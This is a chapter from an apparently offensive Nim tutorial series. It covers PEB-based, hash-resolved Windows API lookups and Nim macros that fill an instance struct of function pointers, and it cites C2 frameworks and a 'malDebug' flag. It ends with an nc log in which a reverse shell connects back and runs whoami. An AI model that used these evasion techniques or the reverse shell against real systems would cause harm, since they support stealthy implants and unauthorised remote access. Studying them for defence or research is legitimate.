# 0x11 - simple instance

One probable problem we have with writing nimless nim is the reuse of our `getModuleHandle` and `getProcAddress` replacements. We might be calling multiple functions throughout our program and it's wasteful to always be accessing the `PEB` for the module handle and resolving pointers to functions. One solution to this is to create an instance to hold our handles and function pointers, so we aren't needlessly calling them over and over again. It is what many C2 frameworks do, such as [Havoc](https://github.com/HavocFramework/Havoc). First off we can start with some more improvements to the overall nimless framework.

### Improving `getModuleHandleH`

In our custom implementation of `getModuleHandle`, we must pass in a hashed string that matches what is in the `PEB` exactly, such as `KERNEL32.DLL`. One improvement we can make to this is to compare our value as a lowercase string (`kernel32`) against a lowercase version of what is from `pDte.FullNameBuffer`.

```nim
  doWhile cast[int](pListNode) != cast[int](pListHead):
    if pDte.FullDllName.Length != 0:
      var 
        tmpStrA: array[MAX_PATH, CHAR]          # create a temp array to hold the target
        pStrW = cast[ptr UncheckedArray[int16]](pDte.FullDllName.Buffer)    # Cast to a pointer for us to iterate over
        idx: int = 0
        isRunning = true    # flag to break out of loop
      # We will loop until we reach the "." that separates the DLL from the dllname
      while (isRunning):
        if pStrW[idx] == cast[int16]('.'):
          tmpStrA[idx] = 0.char     # Adjust the tmpStrA to put a null byte here
          isRunning = false
        if pStrW[idx] == 0:         # Check if we reached the end
          isRunning = false
        else:
          tmpStrA[idx] = toLower(pStrW[idx].CHAR)   # Cast each character as a lowercase char to store in tmpStrA
          idx.inc
        if hash == hashStrA(cast[cstring](tmpStrA[0].addr)):    # Now we can hash as a `cstring`
          return cast[HMODULE](pDte.Reserved2[0])
```

This change is important to us because we are going to be using Nim's macros to do some heavy lifting for us. 

### Macro `getFuncPtr`

Our use case is to have an instance structure that would look like this:

```nim
type
  MODULES* {.pure.} = object
    kernel32*: HMODULE
    ntdll*: HMODULE

  WIN32* {.pure.} = object
    # KERNEL32.DLL
    GetProcessHeap*: type(GetProcessHeap)

    # NTDLL.DLL
    RtlAllocateHeap*: type(RtlAllocateHeap)

  NIMLESS_INSTANCE* {.pure.} = object
    Modules*: MODULES
    Win32*: WIN32
```

Since we are naming each of the modules as the lowercase version of the DLL, we can use the macro the manipulate nim's AST to do some heavy lifting for us. For us to initialize each of the function pointers in our object, we would have to call:

```nim
var ninst: NIMLESS_INSTANCE
ninst.Modules.kernel32 = gmh("kernel32") # our getModuleHandleH wrapper
ninst.Modules.Win32.GetProcessHeap = gpa(ninst.Modules.kernel32, "GetProcessHeap", GetProcessHeap)
```

This is verbose, like in the previous examples. We can leverage macros to simplify the experience such that we can wrap our module handle and the desired function that we want resolved in a macro.

```nim
proc init*(ninst: var NIMLESS_INSTANCE): bool =
    # Load kernel32 functions
    nist.Modules.kernel32 = gmh("kernel32")                             # resolve module handle first
    if ninst.Modules.kernel32 != 0:                                     # check if not nil
      getFuncPtr(ninst.Modules.kernel32, nist.Win32.GetProcessHeap)     # resolve the function pointer.
```

There might be a cleaner way to do this, but without the nim runtime, it's tricky. What we want to do is to write a macro to write out the call to `gpa`. We can use the `dumpTree` macro to see how the assignment from `gpa` is happening

```
# Output from dumpTree
# dumpTree:
#   ninst.Modules.Win32.GetProcessHeap = gpa(ninst.Modules.kernel32, "GetProcessHeap", GetProcessHeap)
StmtList
  Asgn
    DotExpr
      DotExpr
        Ident "ninst"
        Ident "Win32"
      Ident "GetProcessHeap"
    Cast
      Call
        Ident "type"
        DotExpr
          DotExpr
            Ident "ninst"
            Ident "Win32"
          Ident "GetProcessHeap"
      Call
        Ident "getProcAddressHash"
        DotExpr
          DotExpr
            Ident "ninst"
            Ident "Modules"
          Ident "kernel32"
        Call
          Ident "static"
          Call
            Ident "hashStrA"
            DotExpr
              StrLit "GetProcessHeap"
              Ident "cstring"
```

We need to construct a `StatementList` that has an `Assign` node to two values: `ninst.Win32.GetProcessHeap` and our nested call of `cast[type(ninst.Win32.GetProcessHeap)](getProcAddressHash(ninst.Modules.kernel32, static(hashStrA("GetProcessHeap".cstring))))`. This is what `gpa` expands out to from our previous template. 

Starting with the function we can create our procedure such that we define the idents from our two passed arguments to `getFuncPtr`; these two arguments passed as `NimNode` types. We can index into the `NimNode` to extract out the idents.

```nim
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0] # "ninst"
    modul = sect0[0][1] # "Modules"
    handl = sect0[1]    # "kernel32"
    class = sect1[0][1] # "Win32"
    fn    = sect1[1]    # "GetProcessHeap"

# sect0 would look like this
# DotExpr
#  DotExpr
#    Ident "ninst"
#    Ident "Modules"
#  Ident "kernel32"
```

We can start with the first `NimNode` of the AsgnNode, which we need to retype out to be `ninst.Win32.GetProcessHeap` since that's where we will store the value. We can nest a `newDotExpr` inside a `newDotExpr` without passing in idents to create the first part of the tree.

```nim
macro getFuncPtr*(sect0, sect1): untyped =
  var
    # <snip>
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  result.add(asgnNode)
#[
This results in:
StmtList
  Asgn
    DotExpr
      DotExpr
        Ident "ninst"
        Ident "Win32"
      Ident "GetProcessHeap"
]#
```

Writing a procedure to generate the `Cast` section of the AST will help make our macro a little more readable. We can break it down by focusing on the first Call in our AST. We want to call `type(ninst.Win32.GetProcessHeap)`.
```
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =    # We are returning a NimNode
    result = newNimNode(nnkCast)
    var
      callExpr1 = newNimNode(nnkCall)   # we have 2 calls in our cast
      callExpr2 = newNimNode(nnkCall)   # in which the second has 2 nested calls
    callExpr1.add(ident"type", newDotExpr(inst, class), fn)
    result.add(callExpr1)
#[
This results in:
Cast
  Call
    Ident "type"
      DotExpr
        Ident "ninst"
        Ident "Win32"
      Ident "GetProcessHeap"
]#

```

The next part, `callExpr2` will generate out call to our `getProcAddressHash`, which has a nested call to `static`, which then has another nested call to `hashStrA`. This looks like this: `getProcAddressHash(ninst.Module.kernel32, static("GetProcessHeap".cstring))`.

```nim
#[
Target AST:
Call
Ident "getProcAddressHash"
DotExpr
    DotExpr
    Ident "ninst"
    Ident "Modules"
    Ident "kernel32"
Call
    Ident "static"
    Call
    Ident "hashStrA"
    DotExpr
        StrLit "GetProcessHeap"
        Ident "cstring"
]#

proc makeCast(...): NimNode =
  # <snip>
    callExpr2.add(ident"getProcAddressHash",                    # getProcAddressHash(
                newDotExpr(newDotExpr(inst, modul), handl),     #     ninst.Module.kernel32,
                newCall(                                        #     
                  ident"static",                                #     static(
                  newCall(                                      #
                    ident"hashStrA",                            #         hashStrA(
                    newDotExpr(toStrLit(fn), ident"cstring")    #             "GetProcessHeap".cstring
                  )                                             #         )
                )                                               #     )
              )                                                 # )
  result.add(callExpr1)
  result.add(callExpr2)
```

What is cool about this, is we are solely passing in the objects and the macro is generating our function calls based on the names of the objects. Just like in how we use `gpa` to rely on `winim` for getting the types of the function, the macro will use the same way. If the function is not defined in `winim`, it will have to be declared by the operator.

The full macro:

```nim
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =
  result = newNimNode(nnkCast)
  var 
    callExpr1 = newNimNode(nnkCall)
    callExpr2 = newNimNode(nnkCall)
  callExpr1.add(ident"type", newDotExpr(newDotExpr(inst, class), fn))
  callExpr2.add(ident"getProcAddressHash", 
                newDotExpr(newDotExpr(inst, modul), handl),
                newCall(
                  ident"static",
                  newCall(
                    ident"hashStrA",
                    newDotExpr(toStrLit(fn), ident"cstring")
                  )
                )
              )
  result.add(callExpr1)
  result.add(callExpr2)
  
  
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0]
    modul = sect0[0][1]
    handl = sect0[1]
    class = sect1[0][1]
    fn    = sect1[1]
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  asgnNode.add(castExpr)
  result.add(asgnNode)
```

### Caveats

If winim has multiple definitions for one function (I.e: `ExitProcess`), you must define which file of winim to import from, as it will be ambiguous as compile-time. Alternatively, you can type declare the functions yourself.

```nim
type
  WIN32* {.pure.} = object
    # KERNEL32.DLL
    ExitProcess*:        type(winbase.ExitProcess)
```

### Using NIMLESS_INSTANCE

Defined in `instance.nim`, `ninst` is a global variable, but this can also be used on the stack:

```nim
#[ Global Instance ]#
var ninst*: NIMLESS_INSTANCE
```

When used on the stack, you will have to pass it into the functions you wish to call the WinAPI with.

```nim
# Stack usage
proc main() {.exportc: "Main".} =

  var ninst: NIMLESS_INSTANCE

  # Can check for errors - or ignore them
  discard init(ninst)

  doSomething(&ninst)

```

The `utils/stdio.nim` has been updated for use of the `NIMLESS_INSTANCE`. In this case, we rely on checking if the instance has been initialized before printing. 

```nim
import winim/lean

import ../instance

template PRINTA*(args: varargs[untyped]) =
  when defined(malDebug):
    var 
      pwsprintfA     = ninst.Win32.wsprintfA
      pLocalAlloc    = ninst.Win32.LocalAlloc
      pLocalFree     = ninst.Win32.LocalFree
      pGetStdHandle  = ninst.Win32.GetStdHandle
      pWriteConsoleA = ninst.Win32.WriteConsoleA

    var buf = cast[LPSTR](pLocalAlloc(LPTR, 1024))
    if cast[uint](buf) != 0:
      var length = pwsprintfA(buf, args)
      discard pWriteConsoleA(pGetStdHandle(STD_OUTPUT_HANDLE), buf, length, NULL, NULL)
      discard pLocalFree(cast[HLOCAL](buf))
```

We can also port over other functions previously written, such as `0x08 - reverse_shell` and `0x04 - self_delete`.

```bash
{23:11}~ ➭ nc -nvlp 1337
Listening on 0.0.0.0 1337
Connection received on 192.168.1.162 56741
Microsoft Windows [Version 10.0.19045.4291]
(c) Microsoft Corporation. All rights reserved.

C:\Users\user\Desktop\writing_nimless\src\0x11 - simple_instance>whoami
whoami
desktop-1fr9ejt\user
```